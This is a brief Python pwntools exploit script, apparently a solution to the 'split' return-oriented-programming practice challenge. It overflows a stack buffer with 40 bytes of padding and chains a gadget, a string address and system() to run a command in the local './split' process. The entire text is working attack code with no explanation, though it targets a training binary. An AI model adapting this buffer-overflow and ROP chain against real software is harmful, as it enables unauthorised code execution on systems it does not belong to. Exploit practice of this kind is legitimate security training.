from pwn import *

p = process('./split')

gadget = 0x0000000000400883
useful_string = 0x601060
system = 0x4005e0

payload = 'a' * 40
payload += p64(gadget)
payload += p64(useful_string)
payload += p64(system)

p.sendline(payload)
print p.recvall()
